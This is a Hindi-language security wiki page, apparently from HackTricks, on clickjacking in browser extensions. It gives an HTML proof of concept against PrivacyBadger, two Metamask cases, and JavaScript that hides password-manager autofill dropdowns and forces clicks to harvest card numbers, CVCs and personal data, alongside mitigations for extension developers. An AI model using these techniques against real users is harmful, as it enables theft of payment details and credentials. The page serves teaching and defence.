# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

यह पेज एक Browser extension में मौजूद ClickJacking vulnerability का दुरुपयोग करने के बारे में है।  
यदि आपको पता नहीं है कि ClickJacking क्या है तो देखें:

{{#ref}}
../clickjacking.md
{{#endref}}

Extensions में फाइल **`manifest.json`** होती है और उस JSON फाइल में एक फील्ड `web_accessible_resources` होता है। यहाँ [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) का क्या कहना है:

> These resources would then be available in a webpage via the URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, which can be generated with the **`extension.getURL method`**. Allowlisted resources are served with appropriate CORS headers, so they're available via mechanisms like XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

एक browser extension में मौजूद **`web_accessible_resources``** सिर्फ वेब के माध्यम से ही सुलभ नहीं होते; वे extension के inherent privileges के साथ भी चलते हैं। इसका मतलब है कि उनके पास निम्न क्षमताएँ हो सकती हैं:

- Extension की state बदलना
- अतिरिक्त resources लोड करना
- किसी हद तक browser के साथ इंटरैक्ट करना

हालाँकि, यह फीचर एक सुरक्षा जोखिम पैदा करता है। यदि **`web_accessible_resources`** के भीतर कोई resource किसी महत्वपूर्ण कार्यक्षमता के साथ मौजूद है, तो एक attacker उस resource को किसी बाहरी वेब पेज में embed कर सकता है। उस पेज पर जाने वाले अनजान उपयोगकर्ता अनजाने में इस embedded resource को activate कर सकते हैं। इस तरह की activation, extension की permissions और क्षमताओं के आधार पर, अनचाहे परिणाम उत्पन्न कर सकती है।

## PrivacyBadger उदाहरण

PrivacyBadger extension में एक vulnerability मिली थी जो `skin/` directory को `web_accessible_resources` के रूप में घोषित करने से संबंधित थी, जैसा कि निम्नलिखित में दिखाया गया है (मूल [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html) देखें):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
यह कॉन्फ़िगरेशन एक संभावित सुरक्षा समस्या की ओर ले गया। विशिष्ट रूप से, `skin/popup.html` फ़ाइल, जो ब्राउज़र में PrivacyBadger आइकन के साथ इंटरैक्शन पर रेंडर होती है, को एक `iframe` में एम्बेड किया जा सकता था। इस एम्बेडिंग का दुरुपयोग करके उपयोगकर्ताओं को धोखा देकर अनजाने में "Disable PrivacyBadger for this Website" पर क्लिक करवाया जा सकता था। ऐसा करने से उपयोगकर्ता की गोपनीयता प्रभावित होती थी क्योंकि PrivacyBadger सुरक्षा अक्षम हो जाती और संभवतः उपयोगकर्ता अधिक ट्रैकिंग के संपर्क में आ सकता था। इस एक्सप्लॉइट का एक दृश्य प्रदर्शन ClickJacking वीडियो उदाहरण में देखा जा सकता है: [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

इस भेद्यता को संबोधित करने के लिए एक सरल समाधान लागू किया गया: `web_accessible_resources` की सूची से `/skin/*` को हटा दिया गया। इस परिवर्तन ने खतरे को प्रभावी रूप से कम कर दिया क्योंकि इससे `skin/` निर्देशिका की सामग्री को वेब-एक्सेसिबल रिसोर्सेज़ के माध्यम से एक्सेस या मैनिपुलेट नहीं किया जा सका।

फिक्स आसान था: **`web_accessible_resources` से `/skin/*` को हटाएँ**।

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask उदाहरण

[**metamask में ClickJacking के बारे में एक ब्लॉग पोस्ट यहाँ मिल सकती है**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). इस मामले में, Metamask ने vulnerability को ठीक किया यह जाँच करके कि इसे एक्सेस करने के लिए उपयोग किया गया protocol **`https:`** या **`http:`** था (उदाहरण के लिए **`chrome:`** नहीं):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Metamask extension में ठीक किया गया एक और ClickJacking** यह था कि उपयोगकर्ता तब **Click to whitelist** कर सकते थे जब कोई पेज phishing होने का संदेह देता था क्योंकि `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. चूँकि वह पेज Clickjacking के लिए vulnerable था, एक attacker इसका दुरुपयोग कर सकता था कुछ सामान्य दिखाकर ताकि victim बिना ध्यान दिए इसे whitelist करने के लिए क्लिक कर दे, और फिर वापस phishing पेज पर जाकर वह पेज whitelisted हो जाएगा।

## Steam Inventory Helper उदाहरण

नीचे दिए पेज को देखें कि कैसे एक **XSS** browser extension में **ClickJacking** vulnerability के साथ chained हुआ:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

Classic extension clickjacking misconfigured `web_accessible_resources` का उपयोग करके privileged HTML को iframe कर के user clicks को drive करता है। एक नया वर्ग, DOM-based extension clickjacking, password managers द्वारा पेज DOM में सीधे inject किए गए autofill dropdowns को लक्ष्य बनाता है और उन्हें छिपाने या occlude करने के लिए CSS/DOM tricks का उपयोग करता है जबकि उन्हें clickable बनाए रखता है। एक मजबूर क्लिक एक stored item को select कर सकता है और attacker-controlled inputs में sensitive data भर सकता है।

### Threat model

- Attacker किसी webpage को control करता है (या संबंधित डोमेन पर XSS/subdomain takeover/cache poisoning प्राप्त कर लेता है)।
- Victim के पास एक password manager extension installed और unlocked है (कुछ autofill nominally locked होते हुए भी काम करते हैं)।
- कम से कम एक user click induce किया जाता है (overlayed cookie banners, dialogs, CAPTCHAs, games, आदि)।

### Attack flow (manual autofill)

1. एक अदृश्य लेकिन focusable form इंजेक्ट करें (login/PII/credit-card fields)।
2. किसी input को focus करके extension का autofill dropdown फील्ड के पास summon करें।
3. extension UI को छिपाएँ या occlude करें जबकि इसे interactable बनाए रखें।
4. छिपे dropdown के नीचे एक विश्वसनीय control align करें ताकि एक coercive click किसी आइटम को select कर दे।
5. attacker-controlled form से भरे हुए मान पढ़ें और उन्हें exfiltrate करें।

### How to hide the autofill UI

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- ओपन ShadowRoot के अंदर चाइल्ड (डायनेमिक टैग, आंतरिक iframe छिपाएँ):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Parent तत्व
- BODY/HTML opacity तरकीबें ताकि extension UI अदृश्य हो जबकि पेज सामान्य दिखे (उदा., स्क्रीनशॉट पृष्ठभूमि):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Overlay
- Partial overlay: कुछ पिक्सल छोड़कर बाकी सब कुछ छिपा दें ताकि dropdown क्लिक करने योग्य रहे (सुनिश्चित करें attacker overlay DOM में आखिरी हो और max z-index हो, या Top Layer का उपयोग करें).
- Full overlay using pointer-events:none ताकि क्लिक छुपे हुए dropdown तक पहुँच जाएँ; इसे Popover API के साथ स्थायी बनाकर रखें:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### लक्ष्य क्लिक की स्थिति

- स्थिर स्थिति: छिपे हुए ड्रॉपडाउन को एक विश्वसनीय नियंत्रण के नीचे रखें जैसे कि “Accept cookies”, “Close”, या a CAPTCHA checkbox।
- माउस का अनुसरण: फोकस किए गए इनपुट को कर्सर के नीचे ले जाएँ ताकि ड्रॉपडाउन उसका ट्रैक करे; समय-समय पर फिर से फोकस करें ताकि कहीं भी एकल क्लिक करने पर कोई आइटम चुन लिया जाए:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Impact and scenarios

- Attacker-controlled site: एक मजबूर क्लिक credit card data (number/expiry/CVC) और personal info (name, email, phone, address, DOB) को exfiltrate कर सकता है जो domain-scoped नहीं हैं।
- Trusted site with XSS/subdomain takeover/cache poisoning: credentials (username/password) और TOTP की multi-click चोरी हो सकती है, क्योंकि कई managers संबंधित subdomains/parent domains (e.g., `*.example.com`) पर autofill करते हैं।
- Passkeys: यदि RP WebAuthn challenges को session से बाइंड नहीं करता है, तो XSS signed assertion को intercept कर सकता है; DOM-based clickjacking passkey prompt को छिपाकर user का confirming click elicite कर देता है।

### Limitations

- कम से कम एक user click और अच्छा pixel alignment चाहिए (realistic overlays क्लिक करवाना आसान बनाते हैं)।
- Auto-lock/logout exploitation की विंडो को घटाता है; कुछ managers “locked” होने पर भी अभी भी autofill करते हैं।

### Extension developer mitigations

- Render autofill UI in the Top Layer (Popover API) या अन्यथा सुनिश्चित करें कि यह page stacking के ऊपर बैठे; page-controlled overlays द्वारा cover न हो।
- CSS tampering का प्रतिरोध करें: Closed Shadow DOM पसंद करें और UI roots पर suspicious style changes के लिए `MutationObserver` से मॉनिटर करें।
- filling से पहले hostile overlays का पता लगाएँ: अन्य top-layer/popover elements को enumerate करें, अस्थायी रूप से `pointer-events:none` अक्षम करें, और occlusion का पता लगाने के लिए `elementsFromPoint()` का प्रयोग करें; यदि overlays मिलें तो UI बंद कर दें।
- रेंडर से पहले और बाद दोनों में संदिग्ध `<body>`/`<html>` opacity या style परिवर्तन का पता लगाएँ।
- iframe-based समस्याओं के लिए: MV3 `web_accessible_resources` `matches` को संकुचित रखें और HTML UIs को एक्सपोज़ करने से बचें; अत्यावश्यक HTML के लिए `X-Frame-Options: DENY` या `Content-Security-Policy: frame-ancestors 'none'` सर्व करें।


## References

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
